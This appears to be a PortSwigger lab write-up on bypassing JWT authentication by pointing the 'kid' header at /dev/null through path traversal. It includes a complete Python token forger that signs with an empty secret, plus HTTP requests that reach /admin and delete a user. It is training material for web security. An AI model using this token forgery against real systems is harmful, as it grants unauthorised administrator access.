# Lab: JWT authentication bypass via `kid` header path traversal

## LAB DESC

```text
This lab uses a JWT-based mechanism for handling sessions. The server supports the kid parameter in the JWT header to identify the key used for verification. However, the application is vulnerable to path traversal, allowing an attacker to specify an arbitrary file as the key.

To solve the lab, forge a JWT that gives access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter
```

## SOLUTION

After logging in as `wiener`, I captured the JWT from the `session` cookie.

The original JWT contained:

```json
{
  "kid": "6bdf9318-c1eb-4fd2-b246-aa0d2ea03065c",
  "alg": "HS256"
}
```

I exploited the vulnerable `kid` parameter using path traversal:

```json
{
  "kid": "../../../../../../../dev/null",
  "alg": "HS256"
}
```

Since `/dev/null` contains no data, it can be used as an **empty signing secret**.

I then changed the JWT payload:

```json
{
  "iss": "portswigger",
  "exp": 1786366071,
  "sub": "administrator"
}
```

I generated a new `HS256` signature using an empty secret with Python and replaced the original session token with the forged JWT.

### Python

```python
import base64
import json
import hmac
import hashlib

original_token = "ORIGINAL_JWT"

def decode_part(part):
    part += "=" * (-len(part) % 4)
    return json.loads(base64.urlsafe_b64decode(part))

def encode_part(obj):
    data = json.dumps(obj, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header, payload, _ = original_token.split(".")

header = decode_part(header)
payload = decode_part(payload)

header["kid"] = "../../../../../../../dev/null"
header["alg"] = "HS256"
payload["sub"] = "administrator"

header = encode_part(header)
payload = encode_part(payload)

message = f"{header}.{payload}"

signature = hmac.new(
    b"",
    message.encode(),
    hashlib.sha256
).digest()

signature = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

print(f"{message}.{signature}")
```

I then sent the forged JWT to:

```http
GET /admin HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=FORGED_JWT
```

After gaining administrator access, I sent:

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Cookie: session=FORGED_JWT
```

> **LAB SOLVED!**
